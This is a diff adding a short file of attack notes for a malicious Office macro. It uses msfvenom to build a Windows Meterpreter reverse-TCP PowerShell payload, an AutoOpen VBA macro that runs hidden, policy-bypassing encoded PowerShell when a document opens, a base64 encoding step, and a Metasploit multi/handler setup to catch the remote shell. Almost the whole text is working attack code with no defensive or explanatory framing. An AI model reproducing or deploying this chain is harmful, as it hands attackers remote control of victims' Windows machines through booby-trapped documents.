@@ -1,0 +1,26 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f psh-reflection
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh-reflection
+
+step: 2
+Sub AutoOpen()
+    On Error Resume Next
+    Dim objShell As Object
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' Execute the PowerShell payload
+    objShell.Run "powershell -W Hidden -nop -ep bypass -e <BASE64_ENCODED_PAYLOAD>"
+End Sub
+
+base64:
+
+$payload = Get-Content .\payload.ps1 | Out-String
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+Write-Output $encoded
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST <Your_IP>
+set LPORT <Your_Port>
+run
